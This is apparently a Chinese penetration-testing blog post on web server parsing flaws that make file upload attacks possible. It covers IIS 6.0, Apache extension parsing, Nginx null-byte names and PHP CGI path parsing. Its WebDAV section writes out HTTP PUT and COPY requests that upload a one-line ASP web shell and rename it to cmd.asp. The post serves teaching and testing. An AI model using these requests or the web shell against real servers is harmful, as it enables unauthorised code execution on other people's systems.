+++
date = "2016-07-20T16:08:17+08:00"
description = ""
draft = false
tags = ["文件上传"]
title = "文件上传之解析漏洞"
topics = ["Pentest"]

+++

### 0x00 解析漏洞
> ```
文件上传漏洞通常与Web容器的解析漏洞配合利用
常见Web容器有IIS、Nginx、Apache、Tomcat等
```

### 0x01 IIS解析漏洞
> IIS6.0在解析文件时存在以下两个解析漏洞
```
1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。
2、当文件名为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。
```
WebDav漏洞
```
    WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若
支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。

测试步骤如下：
    1）通过OPTIONS探测服务器所支持的HTTP方法
    请求：
    OPTIONS / HTTP/1.1
    Host: www.xxxx.com
    2)通过PUT方法向服务器上传shell
    请求：
    PUT /a.txt HTTP/1.1
    Host: www.xxxx.com
    Content-Length: 30

    <%eval request("chopper") %>
    3)通过Move或Copy方法改名
    请求：
    COPY /a.txt HTTP/1.1
    Host: www.xxxx.com
    Destination: http://www.xxxx.com/cmd.asp
    4)用DELETE方法删除文件
    请求：
    DELETE /a.txt HTTP/1.1
    Host: www.xxxx.com

注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞
```

### 0x02 Apache解析漏洞
> ```
在Apache 1.x和Apache 2.x中存在解析漏洞。

Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析，
直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。
如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制

可以在Apache安装目录下的文件"/conf/mime.types"中配置Apache可以识别的文件名
```

### 0x03 Nginx解析漏洞
> ```
对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击
如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php
```

### 0x04 PHP CGI解析漏洞
> ```
当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问http://www.xxx.com/x.txt/x.php
时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析

IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php
Nginx中：任意文件名/任意文件名.php就会被解析为php
```